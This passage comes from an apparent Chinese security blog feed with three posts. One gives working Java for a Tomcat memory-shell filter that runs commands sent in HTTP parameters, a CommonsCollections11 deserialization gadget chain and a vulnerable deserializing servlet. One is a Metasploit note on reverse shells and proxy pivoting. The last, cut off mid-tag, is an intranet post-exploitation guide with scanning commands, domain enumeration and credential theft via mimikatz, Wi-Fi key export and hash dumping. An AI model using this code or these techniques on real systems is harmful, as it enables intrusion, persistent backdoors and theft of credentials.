servletRequest, ServletResponse servletResponse,</span></span><br><span class="line"><span class="params">                         FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(</span><br><span class="line">                <span class="string">&quot;TomcatShellInject doFilter.....................................................................&quot;</span>);</span><br><span class="line">        String cmd;</span><br><span class="line">        <span class="keyword">if</span> ((cmd = servletRequest.getParameter(cmdParamName)) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd);</span><br><span class="line">            java.io.<span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(process.getInputStream()));</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">stringBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                stringBuilder.append(line + <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());</span><br><span class="line">            servletResponse.getOutputStream().flush();</span><br><span class="line">            servletResponse.getOutputStream().close();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过cc11打入字节码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(&quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC11Template</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = getBytes();</span><br><span class="line">        <span class="type">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f0</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        f0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f0.set(templates,targetByteCodes);</span><br><span class="line"></span><br><span class="line">        f0 = templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        f0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f0.set(templates,<span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line">        f0 = templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        f0.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f0.set(templates,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 利用反射调用 templates 中的 newTransformer 方法</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;asdfasdfasdf&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">innermap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">map</span> <span class="operator">=</span> (LazyMap)LazyMap.decorate(innermap,transformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedmap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map,templates);</span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">hashset</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">        hashset.add(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">        <span class="comment">// 我们要设置 HashSet 的 map 为我们的 HashMap</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField(<span class="string">&quot;backingMap&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashset_map</span> <span class="operator">=</span> (HashMap) f.get(hashset);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField(<span class="string">&quot;elementData&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        f2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] array = (Object[])f2.get(hashset_map);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> array[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="literal">null</span>)&#123;</span><br><span class="line">            node = array[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">keyField</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            keyField = node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            keyField = Class.forName(<span class="string">&quot;java.util.MapEntry&quot;</span>).getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        keyField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        keyField.set(node,tiedmap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在 invoke 之后，</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f3</span> <span class="operator">=</span> transformer.getClass().getDeclaredField(<span class="string">&quot;iMethodName&quot;</span>);</span><br><span class="line">        f3.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f3.set(transformer,<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">          <span class="comment">//ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./cc11Step1.ser&quot;));</span></span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./cc11Step2.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(hashset);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getBytes() <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">      <span class="comment">//    第一次</span></span><br><span class="line"><span class="comment">//        InputStream inputStream = new FileInputStream(new File(&quot;./TomcatEcho.class&quot;));</span></span><br><span class="line">      <span class="comment">//  第二次  </span></span><br><span class="line">      <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;./TomcatInject.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ((n=inputStream.read())!=-<span class="number">1</span>)&#123;</span><br><span class="line">            byteArrayOutputStream.write(n);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>servlet接收http请求并反序列化：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/cc&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CCServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> (InputStream) req;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(inputStream);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            objectInputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> req.getInputStream();</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(inputStream);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            objectInputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行CC11Template得到cc11Step1.ser和cc11Step2.ser，通过curl –data-binary注入二进制数据</p><p>参考：<a href="http://wjlshare.com/archives/1541">http://wjlshare.com/archives/1541</a></p><p><a href="http://wjlshare.com/archives/1536">http://wjlshare.com/archives/1536</a></p><p><a href="https://xz.aliyun.com/t/7348#toc-3">https://xz.aliyun.com/t/7348#toc-3</a></p><p><a href="https://xz.aliyun.com/t/7388">https://xz.aliyun.com/t/7388</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> 内存马 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CC </tag>
            
            <tag> Tomcat </tag>
            
            <tag> 内存马 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>msf笔记</title>
      <link href="/2022/01/03/msf-bi-ji/"/>
      <url>/2022/01/03/msf-bi-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="msf笔记"><a href="#msf笔记" class="headerlink" title="msf笔记"></a>msf笔记</h1><p>先Nmap或者arp-scan扫端口，根据端口攻击。如果开了web端口，就想办法rce反弹shell。拿到shell后扫一下内网，目前只会ping扫，或者升msf，用msf的scan exp扫。然后在靶机上download venom客户端用以代理，在攻击机起服务端，socks通道打通后，更改proxychains4.conf（配置文件，名字可能不一样），实现攻击机的全局代理，然后带上Proxychains nmap扫内网靶机端口</p><blockquote><p>如果靶机打着无回显了，应该是靶机命令还没执行完，比如ping扫内网，命令还没执行完，在shell退了sessions，或者单纯的用ctrl+c，在靶机上命令是还会继续执行的，就导致了后续命令执行不了。这种情况再杀掉session重新打时，之前在靶机上的shell还在，就会发生如下情况：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[-] Command shell session 3 is not valid and will be closed</span><br><span class="line">[*] 192.168.137.129 - Command shell session 3 closed.</span><br></pre></td></tr></table></figure><p>可以把靶机重启，但是要重复许多步骤，最好不要杀掉sessions,进入之前没执行完命令的sessions，然后发送远程ctrl+c</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
          <category> msf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通过边界代理一路打到三层内网+后渗透通用手法</title>
      <link href="/2021/12/10/tong-guo-bian-jie-dai-li-yi-lu-da-dao-san-ceng-nei-wang-hou-shen-tou-tong-yong-shou-fa/"/>
      <url>/2021/12/10/tong-guo-bian-jie-dai-li-yi-lu-da-dao-san-ceng-nei-wang-hou-shen-tou-tong-yong-shou-fa/</url>
      
        <content type="html"><![CDATA[<p>外网进内网通常就是通过web漏洞拿取shell</p><p>内网的很大一部分信息收集是围绕网络拓扑图展开的。可以社工运维或者google找一下。</p><h1 id="内网扩散信息收集"><a href="#内网扩散信息收集" class="headerlink" title="内网扩散信息收集"></a>内网扩散信息收集</h1><p>概述</p><ul><li>内网信息收集 <ul><li>内网网端信息：对内网进行拓扑、分区</li><li>内网大小</li></ul></li><li>内网核心业务信息<ul><li>oa系统、邮件服务器、监控系统….</li></ul></li><li>其他<ul><li>Windows、linux主机信息收集</li></ul></li></ul><p>内网信息收集做的越好，打的越快</p><ul><li>常用方法<ol><li>主动扫描。常用工具: nmap,netdiscover,nc,masscan,自写脚本等</li><li>常用端口和服务探测</li><li>内网拓扑架构分析。如dmz,测试网等</li><li>命令收集</li><li>本机信息</li></ol></li></ul><blockquote><p>nmap的流量很大。因为nmap用了很多方式进行扫描，准确率高的同时流量较大，外网可以用<br>主动扫描留下的痕迹很多且较难清楚。被动扫描需要的时间较长。视情况扫描</p></blockquote><p>一般都是先扫80端口等。因为外网网站可能做的很好，内网网站烂的爆，sql注入、xss等web漏洞一把一把的。</p><h3 id="主动扫描"><a href="#主动扫描" class="headerlink" title="主动扫描"></a>主动扫描</h3><ol><li>ping命令扫描内网中的存活主机<ul><li>优点:方便，一般不会引起流量检测设备的报警</li><li>缺点：扫描速度慢，目标开了防火墙会导致结果不准</li></ul></li><li>nmap扫描存活主机(icmp扫描)<ul><li><code>nmap -sn -PE -n -v -oN 1.txt 目标ip</code></li><li></li><li>参数： -sn 不进行端口扫描;-PE 进行icmp echo扫描;-n 不进行反向解析;-v 输出调试信息;-oN输出</li></ul></li><li><strong>nmap 扫描存活主机(arp扫描)</strong><ul><li><code>nmap -sn -PR -n -v 目标IP</code></li><li>参数：-PR代表arp扫描，在内网中arp扫描速度最快且准确率高</li></ul></li><li>使用netdiscover扫描(arp扫描工具，既可以主动扫描也可以被动嗅探)<ul><li><code>netdiscover -i eth0 -r 目标IP</code></li><li><img src="https://storage.tttang.com/media/attachment/2022/10/29/e8b86246-4805-4a90-8563-0fc49b5dbbb5.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/e8b86246-4805-4a90-8563-0fc49b5dbbb5.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="图片.png"></li><li>参数说明:-i:指定一个接口;-r∶指定扫描范围<ul><li>注意: netdiscover时间越久越精确，可以发现某一台主机在一段时间内介入了那些网段，从而发现其他新的网段地址</li></ul></li></ul></li><li>用nbtscan工具进行快速扫描存活PC端，同时获得NETBIOS(windows往上输入输出服务,139端口)<ul><li><code>nbtscan -r 目标IP</code></li><li><img src="https://storage.tttang.com/media/attachment/2022/10/29/18af01a4-bc60-4d74-86a9-98bdffa39b1c.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/18af01a4-bc60-4d74-86a9-98bdffa39b1c.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="图片.png"></li></ul></li></ol><h3 id="端口和服务扫描"><a href="#端口和服务扫描" class="headerlink" title="端口和服务扫描"></a>端口和服务扫描</h3><ol><li><p>探测目标开放端口</p><ul><li>nmap探测：<code>nmap -Pn -n 目标IP</code>（禁ping扫描)</li><li>masscan扫描：<code>masscan -p 端口号 目标IP地址 --rate=10000</code> #用10kpps速度扫描端口</li><li><img src="https://storage.tttang.com/media/attachment/2022/10/29/e102c14c-fd01-4f8f-83f9-989c0bab605d.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/e102c14c-fd01-4f8f-83f9-989c0bab605d.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="图片.png"></li></ul></li><li><p>探测目标操作系统</p><ul><li><p>使用NSE脚本: <code>nmap --script smb-os-discovery.nse -p 445 目标IP地址</code></p><ul><li>其中: smb-os-discovery.nse脚本通过smb来探测操作系统版本、计算机名、工作组名、域名等等信息。–script指定脚本</li><li><img src="https://storage.tttang.com/media/attachment/2022/10/29/35dde4b7-fb3d-440a-b6f9-1b88a19de252.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/35dde4b7-fb3d-440a-b6f9-1b88a19de252.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="图片.png"></li></ul></li><li><p>使用nmap -O探测操作系统版本<br><code>nmap -O 目标IP</code></p></li></ul></li><li><p>扫描主机存在的CVE漏洞</p><ul><li><code>nmap --script=vuln 目标IP</code></li></ul></li></ol><h3 id="内网常用命令"><a href="#内网常用命令" class="headerlink" title="内网常用命令"></a>内网常用命令</h3><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>net user</td><td>本机用户列表</td></tr><tr><td>net view</td><td>查询同一域内的机器列表</td></tr><tr><td>net localgroup administrators</td><td>查看本机管理员</td></tr><tr><td>net user &#x2F;domain</td><td>查询域用户</td></tr><tr><td>net group &#x2F;domain</td><td>查询域里面的工作组</td></tr><tr><td>net group “domain admins”&#x2F;domain</td><td>查询域管理员用户组</td></tr><tr><td>net localgroup administrators &#x2F;domain</td><td>登陆本机的域管理员</td></tr><tr><td>net localgroup administrators workgroup \user &#x2F;add</td><td>域用户添加到本机</td></tr><tr><td>net group “Domain controllers”</td><td>查看域控</td></tr><tr><td>&#x2F;domain为域渗透参数。域管理有一台权限很高的机器，拿下之后能控制整个域的服务器，称为域控。</td><td></td></tr></tbody></table><ul><li>dsquery 域命令(后面再写域渗透)</li></ul><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>dsquery computer domainroot -limit 65535 &amp;&amp; net group “domain computers”&#x2F;domain</td><td>列出域中内所有机器名</td></tr><tr><td>dsquery user domainroot -limit 65535 &amp;&amp; net user &#x2F;domain</td><td>列出该域内所有用户名</td></tr><tr><td>dsquery subnet</td><td>列出该域内网段划分</td></tr><tr><td>dsquery group &amp;&amp; net group &#x2F;domain</td><td>列出该域内分组</td></tr><tr><td>dsquery ou</td><td>列出该域内组织单位</td></tr><tr><td>dsquery server &amp;&amp; net time &#x2F;domain</td><td>列出该域内控制器</td></tr></tbody></table><h2 id="windows主机信息收集"><a href="#windows主机信息收集" class="headerlink" title="windows主机信息收集"></a>windows主机信息收集</h2><p>这里是在拿下最高权限之后的信息收集。</p><ul><li>主要收集内容</li></ul><blockquote><ol><li>系统管理员密码(hash-&gt;明文)</li><li>其他用户的session，3389，ipc连接记录以及各用户回收站信息收集</li><li>浏览器密码和cookies的获取</li><li>windows无线密码获取</li><li>数据库密码获取</li><li>host文件，dns缓存信息</li><li>杀毒软件，补丁，进程，网络代理信息</li><li>共享文件夹，web服务器配置文件等</li><li>计划任务，账号密码策略，锁定策略</li></ol></blockquote><h3 id="windows杂七杂八的信息收集"><a href="#windows杂七杂八的信息收集" class="headerlink" title="windows杂七杂八的信息收集"></a>windows杂七杂八的信息收集</h3><ul><li>工具：mimikatz、wce、getpass、quarkspwdump、reg-sam、pwdump7等</li></ul><ol><li><p>cmdkey用于保存用户名和密码的凭证。</p><ul><li><code>cmdkey /list</code>查看凭据位置</li><li>netpass.exe获取密码</li></ul></li><li><p>回收站信息获取</p><ul><li>进入回收站文件夹<code>cd C:$RECYCLE.BIN</code>（该文件夹为隐藏文件夹，dir &#x2F;ah查看内容，a指定属性h表示隐藏)</li></ul></li><li><p>获取无线密码</p><ul><li><code>netsh wlan export profile interface=WLAN key=clear folder=C:\</code></li></ul></li><li><p>获取浏览器的cookie和存储密码(chrome)</p><ul><li><code>%localappdata%\google\chrome\USERDATA\default\cookies%localappdata%\googlelchrome\USERDATA\default\Login</code></li><li>Datachrome的用户信息保存在本地文件为sqlite数据库格式</li><li>使用mimikatz读取内容:<br><code>mimikatz.exe privilege:debug log &quot;dpapi:chrome /in:%localappdata%google\chrome\USERDATA\default\cookies /unprotect&quot;</code></li></ul></li></ol><h3 id="msf下的windows信息收集"><a href="#msf下的windows信息收集" class="headerlink" title="msf下的windows信息收集"></a>msf下的windows信息收集</h3><table><thead><tr><th>模块</th><th>使用</th></tr></thead><tbody><tr><td>post&#x2F;windows&#x2F;gather&#x2F;forensics&#x2F;enum_drives</td><td>获取目标主机的磁盘分区情况</td></tr><tr><td>post&#x2F;windows&#x2F;gather&#x2F;checkvm</td><td>判断目标主机是否为虚拟机</td></tr><tr><td>post&#x2F;windows&#x2F;gather&#x2F;enum_services</td><td>查看开启的服务</td></tr><tr><td>post&#x2F;windows&#x2F;gather&#x2F;enum_applications</td><td>查看安装的应用</td></tr><tr><td>post&#x2F;windows&#x2F;gather&#x2F;enum_shares</td><td>查看共享</td></tr><tr><td>post&#x2F;windows&#x2F;gather&#x2F;dumplinks</td><td>查看目标主机最近的操作</td></tr><tr><td>post&#x2F;windows&#x2F;gather&#x2F;enum_patches</td><td>查看补丁信息</td></tr><tr><td>scraper</td><td>导出多个信息</td></tr><tr><td>use or run模块，设置参数后expoilt</td><td></td></tr></tbody></table><h2 id="linux信息收集"><a href="#linux信息收集" class="headerlink" title="linux信息收集"></a>linux信息收集</h2><p>linux信息收集内容比起windows少很多</p><ul><li><p><strong>history命令</strong></p><ul><li>用于显示<strong>历史执行命令</strong>。能显示当前用户在本地计算机中执行的1000条命令。查看更多在&#x2F;etc&#x2F;profile文件中自定义HISTSIZE的变量值。</li><li>使用history -c命令会清空所有命令的历史记录。</li><li>每个用户的history不同</li></ul></li><li><p><strong>last命令</strong></p><ul><li>用于查看系统所有近期登录记录。</li><li>执行last命令时，会读取&#x2F;var&#x2F;log&#x2F;wtmp的文件。<br><img src="https://storage.tttang.com/media/attachment/2022/10/29/be0bdb4e-2582-4010-8246-34b3f959c917.png" class="lazyload placeholder" data-srcset="https://storage.tttang.com/media/attachment/2022/10/29/be0bdb4e-2582-4010-8246-34b3f959c917.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="图片.png"></li><li>用户名 终端位置 登录IP或者内核 开始时间 结束时间</li><li>如果是系统漏洞提权，不属于登录，无记录</li></ul></li><li><p><strong>arp -vn</strong></p><ul><li>聚类检查是否有<strong>超同组业务外</strong>的arp地址</li><li>mac地址对应ip固定，mac不对应ip则为arp欺骗</li></ul></li><li><p>&#x2F;etc&#x2F;hosts文件</p><ul><li>存储域名&#x2F;主机名到ip映射关系</li></ul></li></ul><h3 id="msf下的linux收集"><a href="#msf下的linux收集" class="headerlink" title="msf下的linux收集"></a>msf下的linux收集</h3><table><thead><tr><th>模块</th><th>使用</th></tr></thead><tbody><tr><td>post&#x2F;linux&#x2F;gather&#x2F;checkvm</td><td>判断目标主机是否为虚拟机</td></tr><tr><td>post&#x2F;linux&#x2F;gather&#x2F;enum_configs</td><td>查看配置信息</td></tr><tr><td>post&#x2F;linux&#x2F;gather&#x2F;enum_network</td><td>查看网络</td></tr><tr><td>post&#x2F;linux&#x2F;gather&#x2F;enum_protections</td><td>查看共享</td></tr><tr><td>post&#x2F;linux&#x2F;gather&#x2F;enum_system</td><td>查看系统和用户信息</td></tr><tr><td>post&#x2F;linux&#x2F;gather&#x2F;enum_users_histroy</td><td>查看目标主机最近的操作</td></tr><tr><td>post&#x2F;linux&#x2F;gather&#x2F;hashdump</td><td>获取linux的hash</td></tr></tbody></table><p>但是我仍要强调，被动收集很重要，内网被动收集要安全很多，但是周期很长。主动一分，就危险一分</p><h2 id="收集内容总结"><a href="#收集内容总结" class="headerlink" 